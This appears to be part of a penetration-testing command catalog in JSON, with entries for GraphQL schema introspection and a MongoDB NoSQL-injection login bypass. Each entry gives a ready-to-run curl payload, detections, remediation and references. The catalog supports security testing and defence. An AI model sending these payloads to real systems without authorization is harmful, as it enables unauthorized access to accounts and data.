  {
    "id": "graphql-introspection",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -s -X POST http://<target>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}'",
    "name": "GraphQL Introspection",
    "description": "Queries GraphQL schema to discover all types, fields, and mutations \u2014 full API mapping.",
    "arguments": {
      "__schema": "Introspection query"
    },
    "expected_output": "{\n  \"types\": [\n    {\"name\": \"User\", \"fields\": [{\"name\": \"id\"}, {\"name\": \"email\"}, {\"name\": \"password\"}]}\n  ]\n}",
    "use_case": "Map the entire GraphQL API \u2014 find sensitive fields, mutations, and hidden functionality.",
    "prerequisites": [
      "GraphQL endpoint"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Reconnaissance",
    "detections": [
      "Introspection queries in logs"
    ],
    "remediation": [
      "Disable introspection in production",
      "Implement query depth limiting"
    ],
    "common_mistakes": [
      "Introspection disabled (try field suggestion)"
    ],
    "alternatives": [
      "graphql-voyager",
      "InQL (Burp extension)"
    ],
    "references": [
      "https://graphql.org/learn/introspection/"
    ],
    "tags": [
      "graphql",
      "introspection",
      "api",
      "schema",
      "discovery"
    ]
  },
  {
    "id": "nosql-injection",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -X POST http://<target>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
    "name": "NoSQL Injection",
    "description": "Tests for MongoDB NoSQL injection using operator injection ($ne, $gt, $regex).",
    "arguments": {
      "$ne": "Not equal operator (bypasses auth)"
    },
    "expected_output": "{\n  \"token\": \"eyJhbGciOiJIUzI1NiJ9...\",\n  \"user\": \"admin\"\n}",
    "use_case": "Bypass authentication in MongoDB-backed applications using operator injection.",
    "prerequisites": [
      "MongoDB backend",
      "JSON input accepted"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "Unusual MongoDB operators in input",
      "Auth bypass events"
    ],
    "remediation": [
      "Input validation",
      "Use parameterized queries",
      "Sanitize $ operators"
    ],
    "common_mistakes": [
      "Application doesn't use MongoDB"
    ],
    "alternatives": [
      "nosqlmap",
      "burp with NoSQL payloads"
    ],
    "references": [
      "https://book.hacktricks.wiki/en/pentesting-web/nosql-injection"
    ],
    "tags": [
      "nosql",
      "mongodb",
      "injection",
      "authentication-bypass"
    ]
  },
